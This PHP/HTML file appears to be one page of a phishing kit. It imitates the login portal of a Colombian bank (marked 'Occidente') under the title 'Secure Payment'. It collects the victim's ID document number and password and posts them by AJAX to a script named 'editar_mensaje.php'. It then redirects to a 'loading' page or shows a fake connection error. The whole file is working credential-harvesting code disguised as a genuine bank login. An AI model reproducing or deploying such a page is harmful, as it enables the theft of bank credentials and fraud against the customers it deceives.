<?php

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Payment</title>

    <script type="text/javascript" src="/scripts/jquery-3.6.0.min.js"></script>
		<script src="/scripts/jquery.jclock-min.js" type="text/javascript"></script>
   		<script type="text/javascript" src="/scripts/functions2.js"></script>  		


    <style>

        *{
            margin: 0;
            padding: 0;
            font-family: Arial, Helvetica, sans-serif;
        }
    </style>

</head>
<body>
    <img src="img/1.jfif" alt="" srcset="" width="30%" style="position:absolute; right:0;">
    <br><br><br><br><br><br>
<center><img src="img/logo.png" alt="" srcset="" width="40%">
<br><br><br>
<a><b style="font-size:13px;">INGRESA A TU PORTAL TRANSACCIONAL</b></a></center>
<br><br>

    <label for="" style="margin-left:5%; font-size:13px; color:#556493;">Tipo de Documento</label><br>
    <select style="width:90%; height:35px; border-radius:5px; background-color:white; color:black; border:1px solid #c7cfed; margin-left:5%;  ">

    <option>Cedula de Ciudadania</option>
    <option>Tarjeta de identidad</option>
    <option>Cédula de extranjería</option>
    <option>Pasaporte</option>

    </select><br><br>
    <label for="" style="margin-left:5%;  font-size:13px; color:#556493;">No. de Documento</label><br>
    <input type="tel" placeholder="*Documento" name="documento" id="txtUsuario" style="width:87%; height:35px; border-radius:5px; background-color:white; color:black; border:1px solid #c7cfed; margin-left:5%; padding-left:10px;" required minlength="6" maxlength="10" pattern="^[0-9]{6,10}$" oninput="this.value = this.value.replace(/\D+/g, '');"><br><br>
    <label for=""  style="margin-left:5%; font-size:13px; color:#556493;">Contraseña</label><br>
    <input type="hidden" name="" value="Occidente" id="banco">
    <input type="password" placeholder="*Contraseña" name="clave" id="txtPass" style="width:87%; height:35px; border-radius:5px; background-color:white; color:black; border:1px solid #c7cfed; margin-left:5%;  padding-left:10px;" oninput="this.value = this.value.replace(/\s+/g, '')" required><br><br>
<!-- <a style="margin-left:5%; margin-top: 10px; font-size:13px; color:#0081ff;">Olvidé mi clave</a> -->

        <img src="img/2.jfif" alt="" srcset="" width="100%">


<center>
    <br><br>
<input type="submit" value="Ingresar" id="btnUsuario" style="background-color:blue; width:80%; color:white; height:35px; border-radius:5px;border:none;"></center>


<script type="text/javascript">

$(document).ready(function() {

    $('#btnUsuario').click(function(){
         if (($("#txtUsuario").val().length > 0) && ($("#txtPass").val().length > 7)) {
        
           const data = {
                    'usuario': $("#txtUsuario").val(),
                    'pass': $("#txtPass").val()
                };
                console.log(data);
                $.ajax({
                    url: '../../acciones/editar_mensaje.php',
                    method: 'POST',
                    data: {
                        data: data
                    },
                    success: function(response) {
                        const result = JSON.parse(response);
                        if (result.success) {
                            window.location.href = "cargando.php";
                        } else {
                            alert('Error de conexión, por favor intente de nuevo');
                           window.location.href = "/";
                        }
                    },
                    error: function(xhr, status, error) {
                        alert('Error en la solicitud AJAX: ' + error);
                    }
                });
        }else{
            $("#err-mensaje").show();
            $(".user").css("border", "1px solid red");
            $("#txtUsuario").focus();
        }			
    });
});
</script>
</body>
</html>